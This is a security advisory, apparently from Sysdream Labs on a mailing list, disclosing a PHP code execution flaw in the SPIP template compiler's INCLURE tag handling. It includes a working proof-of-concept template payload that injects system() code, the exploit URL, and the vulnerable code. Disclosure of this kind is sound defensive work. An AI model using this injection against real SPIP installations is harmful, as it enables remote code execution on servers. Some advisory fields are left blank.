It is free software, distributed under the GNU/GPL licence.  ### Vulnerability Description  The SPIP template composer/compiler does not correctly handle SPIP "INCLUDE/INCLURE" Tags, allowing PHP code execution by an authenticated user. This vulnerability can be exploited using the CSRF or the XSS vulnerability also found in this advisory.  **Access Vector**: remote  **Security Risk**: critical  **Vulnerability**: CWE-94  **CVSS Base Score**: 9.1 (Critical)  **CVE-ID**:  ### Proof of Concept  Store a `.html` file in a random directory with the following content :      <INCLURE(xxx"\)\);}system\("touch /tmp/exploited"\);/*)>  Then you can access to the following URL, with the `var_url` paramater pointing to the path corresponding to your uploaded file:      http://spip-dev.srv/ecrire/?exec=valider_xml&var_url=file:///tmp/directory&ext=html  The PHP code `system("touch /tmp/exploited");` will be executed after 2 requests.  This happens because the template file is included (if already compiled) by `ecrire/public/composer.php`, line 60 :      if (!squelette_obsolete($phpfile, $source)) {       include_once $phpfile;  and because we can "exit" the function generated by the template compiler (improper sanitization when generating argumenter_squelette):      function html_xxxx($Cache, $Pile, $doublons = array(), $Numrows = array(), $SP = 0) {       if (isset($Pile[0]["doublons"]) AND is_array($Pile[0]["doublons"]))         $doublons = nettoyer_env_doublons($Pile[0]["doublons"]);       $connect = '';       $page = (     '<'.'?php echo recuperer_fond( ' . argumenter_squelette("xxx"));}system("touch /tmp/exploited");/*") . ', array(\'lang\' => ' . argumenter_squelette($GLOBALS["spip_lang"]) . '), array("compil"=>array(\'/tmp/exploit.html\',\'html_xxxx\',\'\',1,$GLOBALS[\'spip_lang\'])), _request("connect"));     ?'.'>     ');       return analyse_resultat_skel('html_xxxx', $Cache, $page, '/tmp/exploit.html');     }  Therefore, the vulnerability leads to arbitrary PHP code execution.   ### Vulnerable code  The vulnerable code is located in the `argumenter_inclure` function (`ecrire/public/compiler.php`), line      if ($var !== 1) {       $val = ($echap ? "\'$var\' => ' . argumenter_squelette(" : "'$var' => ")         . $val . ($echap ? ") . '" : " ");     }  ### Timeline (dd/mm/yyyy)  * : Initial discovery * : Contact with SPIP Team * : Answer from SPIP Team, sent advisory details * : Fixes issued for PHP Code Execution * : SPIP Released  ### Fixes  * * *  ### Affected versions  * Version <=  ### Credits  * Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)   --  SYSDREAM Labs <labs@...dream.com>  GPG : C43E 2A2E 8EB4 8CD9 D5B2  * Website: https://sysdream.com/ * Twitter: @sysdream          Download attachment "signature.asc" of type "application/pgp-signature" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
